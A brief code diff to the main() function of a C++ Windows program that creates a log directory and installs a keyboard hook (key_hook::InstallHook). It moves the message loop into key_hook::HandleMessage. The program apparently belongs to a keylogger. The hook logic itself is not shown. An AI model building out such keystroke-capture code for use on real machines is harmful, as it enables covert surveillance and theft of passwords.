@@ -5,13 +5,7 @@ int main() {
   stream::MakeDir(stream::GetPath());
   key_hook::InstallHook();
 
-  stream::WriteLog("hi");
-
-	MSG msg;
-	while (GetMessage(&msg, nullptr, 0, 0)) {
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
+  key_hook::HandleMessage(true);
 
   return 0;
 }
